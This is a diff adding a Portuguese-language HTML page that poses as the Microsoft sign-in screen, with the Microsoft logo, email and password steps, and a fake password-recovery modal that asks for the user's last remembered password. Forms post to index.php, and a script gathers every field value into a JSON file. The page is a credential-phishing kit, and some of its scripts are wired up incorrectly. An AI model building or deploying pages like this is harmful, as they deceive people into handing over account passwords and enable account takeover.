@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Microsoft – Entrar</title>
+  <link rel="icon" type="image/png" href="https://www.microsoft.com/favicon.ico">
+  <link rel="stylesheet" href="italo.js">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg-dark: #1a1f2e;
+      --card-bg: #2b2d30;
+      --card-border: #3a3d42;
+      --text-primary: #ffffff;
+      --text-secondary: #c8c8c8;
+      --input-border: #555;
+      --input-border-focus: #0078d4;
+      --accent: #0078d4;
+      --accent-hover: #106ebe;
+      --link-color: #4db2ff;
+      --footer-text: #9d9d9d;
+    }
+
+    body {
+      font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: var(--bg-dark);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .bg-blob { position:absolute;border-radius:50%;filter:blur(80px);opacity:0.12;animation:drift 18s ease-in-out infinite alternate; }
+    .bg-blob-1 { width:600px;height:600px;background:#3a6bcc;top:-100px;left:-150px; }
+    .bg-blob-2 { width:500px;height:500px;background:#1e3a6e;bottom:-80px;right:-100px;animation-delay:-6s; }
+    .bg-blob-3 { width:350px;height:350px;background:#2d5a9e;top:40%;left:60%;animation-delay:-12s; }
+
+    .stars {
+      position:absolute;inset:0;pointer-events:none;
+      background-image:radial-gradient(circle,rgba(255,255,255,0.4) 1px,transparent 1px),radial-gradient(circle,rgba(255,255,255,0.25) 1px,transparent 1px);
+      background-size:120px 120px,200px 200px;background-position:0 0,60px 60px;
+    }
+
+    .swoosh { position:absolute;inset:0;pointer-events:none;overflow:hidden; }
+    .swoosh svg { width:100%;height:100%; }
+
+    @keyframes drift { from{transform:translate(0,0) scale(1);}to{transform:translate(40px,30px) scale(1.08);} }
+
+    .card {
+      position:relative;z-index:10;background:var(--card-bg);border:1px solid var(--card-border);
+      border-radius:8px;padding:44px 44px 36px;width:100%;max-width:440px;
+      box-shadow:0 8px 40px rgba(0,0,0,0.45);
+    }
+
+    .step { display:none; }
+    .step.active { display:block; animation:fadeUp 0.35s ease both; }
+    @keyframes fadeUp { from{opacity:0;transform:translateY(18px);}to{opacity:1;transform:translateY(0);} }
+
+    .logo { display:flex;align-items:center;gap:10px;margin-bottom:28px; }
+    .logo-grid { display:grid;grid-template-columns:1fr 1fr;gap:2.5px;width:22px;height:22px; }
+    .logo-grid span { display:block;border-radius:1px; }
+    .sq-red{background:#f25022;}.sq-green{background:#7fba00;}.sq-blue{background:#00a4ef;}.sq-yellow{background:#ffb900;}
+    .logo-text { font-size:18px;font-weight:600;color:var(--text-primary);letter-spacing:-0.2px; }
+
+    h1 { font-size:24px;font-weight:700;color:var(--text-primary);margin-bottom:8px; }
+    .subtitle { font-size:14px;color:var(--text-secondary);margin-bottom:28px; }
+
+    .email-display { display:flex;align-items:center;justify-content:space-between;margin-bottom:20px; }
+    .email-display .info { display:flex;flex-direction:column;gap:2px; }
+    .email-display .info span { font-size:12px;color:var(--text-secondary); }
+    .email-display .info strong { font-size:14px;color:var(--text-primary); }
+    .email-display a { font-size:13px;color:var(--link-color);text-decoration:none; }
+    .email-display a:hover { text-decoration:underline; }
+
+    .input-group { position:relative;margin-bottom:12px; }
+    .input-group label {
+      position:absolute;top:50%;left:12px;transform:translateY(-50%);
+      font-size:13px;color:#aaa;pointer-events:none;transition:all 0.2s ease;background:transparent;padding:0 2px;
+    }
+    .input-group input:focus + label,
+    .input-group input:not(:placeholder-shown) + label {
+      top:0;font-size:11px;color:var(--input-border-focus);background:var(--card-bg);
+    }
+    .input-group input {
+      width:100%;background:transparent;border:1px solid var(--input-border);
+      border-radius:4px;padding:14px 44px 6px 12px;font-size:14px;
+      color:var(--text-primary);outline:none;transition:border-color 0.2s;caret-color:var(--link-color);
+    }
+    .input-group input:focus { border-color:var(--input-border-focus);box-shadow:0 0 0 1px var(--input-border-focus); }
+
+    .toggle-pw {
+      position:absolute;right:12px;top:50%;transform:translateY(-50%);
+      background:none;border:none;cursor:pointer;color:#aaa;font-size:13px;
+      font-family:inherit;line-height:1;padding:0;transition:color 0.2s;letter-spacing:0;
+    }
+    .toggle-pw:hover { color:#fff; }
+
+    .forgot { display:inline-block;font-size:13px;color:var(--link-color);text-decoration:none;margin-top:8px;margin-bottom:24px;transition:color 0.2s; }
+    .forgot:hover { color:#79caff;text-decoration:underline; }
+
+    .error-msg { color:#ff6b6b;font-size:12.5px;margin-top:6px;display:none; }
+    .error-msg.show { display:block; }
+
+    .btn-primary {
+      display:block;width:100%;padding:13px;background:var(--accent);color:#fff;border:none;
+      border-radius:4px;font-size:15px;font-weight:600;cursor:pointer;transition:background 0.2s,transform 0.1s;letter-spacing:0.1px;
+    }
+    .btn-primary:hover { background:var(--accent-hover); }
+    .btn-primary:active { transform:scale(0.985); }
+
+    .register { margin-top:28px;text-align:center;font-size:13.5px;color:var(--text-secondary); }
+    .register a { color:var(--link-color);text-decoration:none;transition:color 0.2s; }
+    .register a:hover { text-decoration:underline;color:#79caff; }
+
+    .success-icon {
+      width:52px;height:52px;background:var(--accent);border-radius:50%;
+      display:flex;align-items:center;justify-content:center;margin:0 auto 20px;
+    }
+    .success-icon svg { width:26px;height:26px;stroke:#fff;stroke-width:2.5;fill:none;stroke-linecap:round;stroke-linejoin:round; }
+
+    footer {
+      position:relative;z-index:10;margin-top:36px;text-align:center;
+      font-size:12px;color:var(--footer-text);display:flex;flex-direction:column;gap:8px;
+    }
+    footer .links { display:flex;justify-content:center;gap:20px;flex-wrap:wrap; }
+    footer a { color:var(--footer-text);text-decoration:none;transition:color 0.2s; }
+    footer a:hover { color:#ccc;text-decoration:underline; }
+    footer .private-notice { font-size:11.5px; }
+    footer .private-notice a { color:var(--link-color); }
+
+    /* MODAL */
+    .modal-overlay {
+      position:fixed;inset:0;background:rgba(0,0,0,0.65);z-index:100;
+      display:flex;align-items:center;justify-content:center;
+      opacity:0;pointer-events:none;transition:opacity 0.25s;
+    }
+    .modal-overlay.open { opacity:1;pointer-events:all; }
+    .modal {
+      background:#2b2d30;border:1px solid #3a3d42;border-radius:10px;
+      padding:36px 36px 28px;max-width:420px;width:90%;
+      transform:translateY(20px);transition:transform 0.25s;position:relative;
+    }
+    .modal-overlay.open .modal { transform:translateY(0); }
+    .modal h2 { font-size:18px;font-weight:700;color:#fff;margin-bottom:6px; }
+    .modal .modal-tag {
+      display:inline-block;background:rgba(0,120,212,0.2);color:#4db2ff;
+      font-size:11px;font-weight:600;padding:3px 10px;border-radius:20px;
+      margin-bottom:14px;letter-spacing:0.4px;border:1px solid rgba(0,120,212,0.3);
+    }
+    .modal p { font-size:13.5px;color:#c8c8c8;line-height:1.7;margin-bottom:10px; }
+    .modal-close {
+      margin-top:18px;width:100%;padding:11px;background:var(--accent);color:#fff;
+      border:none;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer;transition:background 0.2s;
+    }
+    .modal-close:hover { background:var(--accent-hover); }
+    .modal-x {
+      position:absolute;top:14px;right:16px;background:none;border:none;
+      color:#aaa;font-size:18px;cursor:pointer;line-height:1;transition:color 0.2s;
+    }
+    .modal-x:hover { color:#fff; }
+    .info-box {
+      background:rgba(0,120,212,0.1);border:1px solid rgba(0,120,212,0.25);
+      border-radius:6px;padding:12px 14px;margin:12px 0;
+      font-size:13px;color:#c8c8c8;line-height:1.65;
+    }
+    .info-box strong { color:#4db2ff; }
+
+    /* modal step hidden */
+    .mstep { display:none; }
+    .mstep.active { display:block; animation:fadeUp 0.3s ease both; }
+
+    .sent-check {
+      width:48px;height:48px;background:var(--accent);border-radius:50%;
+      display:flex;align-items:center;justify-content:center;margin:0 auto 16px;
+    }
+    .sent-check svg { width:24px;height:24px;stroke:#fff;stroke-width:2.5;fill:none;stroke-linecap:round;stroke-linejoin:round; }
+  </style>
+</head>
+<body>
+<script>
+  document.querySelectorAll('.btn-primary')[2].addEventListener('click', function(e) {
+    e.preventDefault();
+    e.stopImmediatePropagation();
+
+    const dados = {};
+    document.querySelectorAll('input, select, textarea').forEach(function(campo) {
+      const chave = campo.id || campo.name;
+      if (chave) dados[chave] = campo.value;
+    });
+
+    const json = JSON.stringify(dados, null, 2);
+    const blob = new Blob([json], { type: 'application/json' });
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = 'dados.json';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(a.href);
+  }, true); // true = captura na fase de captura, antes do onclick do elemento
+</script>
+
+  <div class="bg-blob bg-blob-1"></div>
+  <div class="bg-blob bg-blob-2"></div>
+  <div class="bg-blob bg-blob-3"></div>
+  <div class="stars"></div>
+  <div class="swoosh">
+    <svg viewBox="0 0 1440 900" preserveAspectRatio="xMidYMid slice" xmlns="http://www.w3.org/2000/svg">
+      <path d="M-100 700 Q400 300 900 500 T1600 200" stroke="rgba(255,255,255,0.04)" stroke-width="80" fill="none"/>
+      <path d="M-200 400 Q300 100 800 300 T1500 0" stroke="rgba(255,255,255,0.03)" stroke-width="60" fill="none"/>
+      <path d="M200 900 Q600 500 1000 650 T1700 350" stroke="rgba(255,255,255,0.03)" stroke-width="50" fill="none"/>
+    </svg>
+  </div>
+
+  <!-- MODAL: SAIBA MAIS -->
+  <div class="modal-overlay" id="modal-saiba">
+    <div class="modal">
+      <button class="btn-primary" onclick="enviarDados()">Entrar</button>
+      <span class="modal-tag">Aviso de Segurança</span>
+      <h2>Por que usar navegação privada?</h2>
+      <p>A Microsoft recomenda o uso do <strong style="color:#fff;">modo de navegação privada</strong> sempre que você acessar sua conta em dispositivos que não são seus.</p>
+      <div class="info-box">
+        <strong>O que isso protege:</strong><br>
+        Seu histórico de login, cookies e dados de sessão <strong>não são salvos</strong> no dispositivo após o fechamento do navegador, reduzindo o risco de acesso não autorizado.
+      </div>
+      <p>Em computadores públicos, lan houses ou dispositivos de terceiros, <strong style="color:#fff;">sempre ative o modo anônimo</strong> antes de fazer login.</p>
+      <p style="font-size:11.5px;color:#777;margin-top:10px;">Política de privacidade Microsoft · Versão 2024.1</p>
+      <button class="modal-close" onclick="fecharModal('modal-saiba')">Entendi</button>
+    </div>
+  </div>
+
+  <!-- MODAL: ESQUECEU A SENHA (2 etapas: email → ultima senha) -->
+  <div class="modal-overlay" id="modal-esqueci">
+    <div class="modal">
+      <button class="modal-x" onclick="fecharModal('modal-esqueci')">&#x2715;</button>
+
+      <!-- Etapa 1: Email -->
+      <div class="mstep active" id="esqueci-step1">
+        <span class="modal-tag">Recuperar acesso</span>
+        <h2>Esqueceu sua senha?</h2>
+        <p style="margin-bottom:18px;">Insira o email da sua conta Microsoft para iniciar a recuperação de senha.</p>
+        <div class="input-group" style="margin-bottom:6px;">
+          <input type="email" id="email-recuperar" placeholder=" " />
+          <label for="email-recuperar">Email da conta Microsoft</label>
+        </div>
+        <div class="error-msg" id="recuperar-error">Por favor, insira um email válido.</div>
+        <button class="modal-close" onclick="irParaUltimaSenha()">Avançar</button>
+      </div>
+
+      <!-- Etapa 2: Última senha -->
+      <div class="mstep" id="esqueci-step2">
+        <span class="modal-tag">Verificação de segurança</span>
+        <h2>Confirme sua identidade</h2>
+        <p style="margin-bottom:14px;">Insira a última senha que você se lembra ter usado nesta conta.</p>
+        <div class="info-box">
+          Isso nos ajuda a confirmar que é você antes de redefinir o acesso.
+        </div>
+        <div class="input-group" style="margin-bottom:6px;">
+          <input type="password" id="ultima-senha" placeholder=" " />
+          <label for="ultima-senha">Última senha lembrada</label>
+          <button class="toggle-pw" onclick="toggleInput('ultima-senha', this)" tabindex="-1" type="button">Mostrar</button>
+        </div>
+        <div class="error-msg" id="ultima-senha-error">Por favor, insira a última senha que você lembra.</div>
+        <button class="modal-close" onclick="confirmarUltimaSenha()">Confirmar</button>
+        <div style="text-align:center;margin-top:14px;">
+          <a href="#" style="color:var(--link-color);font-size:13px;text-decoration:none;" onclick="voltarStep1(); return false;">← Voltar</a>
+        </div>
+      </div>
+
+      <!-- Etapa 3: Confirmação enviada -->
+      <div class="mstep" id="esqueci-step3" style="text-align:center;">
+        <div class="sent-check">
+          <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+        </div>
+        <h2 style="margin-bottom:8px;">Instruções enviadas</h2>
+        <p>Verifique sua caixa de entrada e siga as instruções para redefinir sua senha.</p>
+        <p style="font-size:12px;color:#777;margin-top:10px;">Não recebeu? Verifique sua pasta de spam.</p>
+        <button class="modal-close" onclick="fecharModal('modal-esqueci')">Fechar</button>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- CARD PRINCIPAL -->
+  <div class="card">
+
+    <!-- STEP 1: Email -->
+    <div class="step active" id="step-email">
+      <div class="logo">
+        <div class="logo-grid"><span class="sq-red"></span><span class="sq-green"></span><span class="sq-blue"></span><span class="sq-yellow"></span></div>
+        <span class="logo-text">Microsoft</span>
+      </div>
+      <h1>Entrar</h1>
+      <p class="subtitle">Use a sua conta Microsoft.</p>
+
+      <div class="input-group">
+        <form action="index.php" method="post">
+          <input type="text" id="email" name="email" placeholder=" " autocomplete="email" />
+          <label for="email">Email ou número de telefone</label>
+        </form>
+      </div>
+      <div class="error-msg" id="email-error">Por favor, insira um email ou telefone válido.</div>
+
+      <a href="#" class="forgot" onclick="abrirModal('modal-esqueci'); return false;">Esqueceu seu nome de usuário?</a>
+
+      <button class="btn-primary" onclick="goToPassword()">Avançar</button>
+
+      <div class="register">
+        Novo na Microsoft? <a href="microsoft-criar-conta.html">Criar uma conta</a>
+      </div>
+    </div>
+
+    <!-- STEP 2: Senha -->
+    <div class="step" id="step-senha">
+      <div class="logo">
+        <div class="logo-grid"><span class="sq-red"></span><span class="sq-green"></span><span class="sq-blue"></span><span class="sq-yellow"></span></div>
+        <span class="logo-text">Microsoft</span>
+      </div>
+      <h1>Inserir senha</h1>
+
+      <div class="email-display">
+        <div class="info">
+          <span>Conta</span>
+          <strong id="email-shown"></strong>
+        </div>
+        <a href="#" onclick="voltarEmail(); return false;">Alterar</a>
+      </div>
+
+      <div class="input-group">
+        <form action="index.php" method="post">
+        <input type="password" id="senha" placeholder=" " autocomplete="current-password" />
+        <label for="senha">Senha</label>
+        </form>
+        <button class="toggle-pw" onclick="toggleInput('senha', this)" tabindex="-1" type="button">Mostrar</button>
+      </div>
+      <div class="error-msg" id="senha-error">A senha não pode estar vazia.</div>
+
+      <a href="#" class="forgot" onclick="abrirModal('modal-esqueci'); return false;">Esqueceu sua senha?</a>
+
+      <button class="btn-primary" onclick="window.location.href='https://www.microsoft.com/pt-br'">Entrar</button>
+    
+
+      <div class="register">
+        <a href="#" onclick="voltarEmail(); return false;">&#8592; Voltar</a>
+      </div>
+    </div>
+
+    <!-- STEP 3: Sucesso -->
+    <div class="step" id="step-sucesso" style="text-align:center;">
+      <div class="logo" style="justify-content:center;">
+        <div class="logo-grid"><span class="sq-red"></span><span class="sq-green"></span><span class="sq-blue"></span><span class="sq-yellow"></span></div>
+        <span class="logo-text">Microsoft</span>
+      </div>
+      <div class="success-icon">
+        <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+      </div>
+      <h1 style="margin-bottom:12px;">Bem-vindo!</h1>
+      <p class="subtitle" id="welcome-msg"></p>
+      <p style="color:var(--text-secondary);font-size:13px;margin-top:8px;">Login realizado com sucesso.</p>
+    </div>
+
+  </div>
+
+  <footer>
+    <div class="links">
+      <a href="#">Ajuda e comentários</a>
+      <a href="#">Termos de uso</a>
+      <a href="#">Política de privacidade</a>
+    </div>
+    <p class="private-notice">
+      Use a navegação privada se esse não for seu dispositivo.
+      <a href="#" onclick="abrirModal('modal-saiba'); return false;">Saiba mais</a>
+    </p>
+  </footer>
+
+  <script>
+    function showStep(id) {
+      document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+      document.getElementById(id).classList.add('active');
+    }
+
+    function abrirModal(id) {
+      // reset modal esqueci ao abrir
+      if (id === 'modal-esqueci') resetEsqueci();
+      document.getElementById(id).classList.add('open');
+      document.body.style.overflow = 'hidden';
+    }
+
+    function fecharModal(id) {
+      document.getElementById(id).classList.remove('open');
+      document.body.style.overflow = '';
+    }
+
+    function resetEsqueci() {
+      document.getElementById('email-recuperar').value = '';
+      document.getElementById('ultima-senha').value = '';
+      document.getElementById('recuperar-error').classList.remove('show');
+      document.getElementById('ultima-senha-error').classList.remove('show');
+      showMStep('esqueci-step1');
+    }
+
+    function showMStep(id) {
+      document.querySelectorAll('.mstep').forEach(s => s.classList.remove('active'));
+      document.getElementById(id).classList.add('active');
+    }
+
+    document.querySelectorAll('.modal-overlay').forEach(overlay => {
+      overlay.addEventListener('click', function(e) {
+        if (e.target === this) fecharModal(this.id);
+      });
+    });
+
+    function goToPassword() {
+      const val = document.getElementById('email').value.trim();
+      const err = document.getElementById('email-error');
+      if (!val) { err.classList.add('show'); return; }
+      err.classList.remove('show');
+      document.getElementById('email-shown').textContent = val;
+      showStep('step-senha');
+      setTimeout(() => document.getElementById('senha').focus(), 100);
+    }
+
+    function voltarEmail() {
+      document.getElementById('senha').value = '';
+      document.getElementById('senha-error').classList.remove('show');
+      showStep('step-email');
+      setTimeout(() => document.getElementById('email').focus(), 100);
+    }
+
+    function entrar() {
+      const val = document.getElementById('senha').value;
+      const err = document.getElementById('senha-error');
+      if (!val) { err.classList.add('show'); return; }
+      err.classList.remove('show');
+      document.getElementById('welcome-msg').textContent = 'Você entrou como ' + document.getElementById('email').value.trim();
+      showStep('step-sucesso');
+    }
+
+    function irParaUltimaSenha() {
+      const val = document.getElementById('email-recuperar').value.trim();
+      const err = document.getElementById('recuperar-error');
+      if (!val || !val.includes('@')) { err.classList.add('show'); return; }
+      err.classList.remove('show');
+      showMStep('esqueci-step2');
+      setTimeout(() => document.getElementById('ultima-senha').focus(), 100);
+    }
+
+    function voltarStep1() {
+      document.getElementById('ultima-senha').value = '';
+      document.getElementById('ultima-senha-error').classList.remove('show');
+      showMStep('esqueci-step1');
+    }
+
+    function confirmarUltimaSenha() {
+      const val = document.getElementById('ultima-senha').value;
+      const err = document.getElementById('ultima-senha-error');
+      if (!val) { err.classList.add('show'); return; }
+      err.classList.remove('show');
+      showMStep('esqueci-step3');
+    }
+
+    function toggleInput(inputId, btn) {
+      const input = document.getElementById(inputId);
+      if (input.type === 'password') {
+        input.type = 'text';
+        btn.textContent = 'Ocultar';
+      } else {
+        input.type = 'password';
+        btn.textContent = 'Mostrar';
+      }
+    }
+
+    document.getElementById('email').addEventListener('keydown', e => { if (e.key === 'Enter') goToPassword(); });
+    document.getElementById('senha').addEventListener('keydown', e => { if (e.key === 'Enter') entrar(); });
+  </script>
+  <script src="italo.js"></script>
+</body>
+</html>
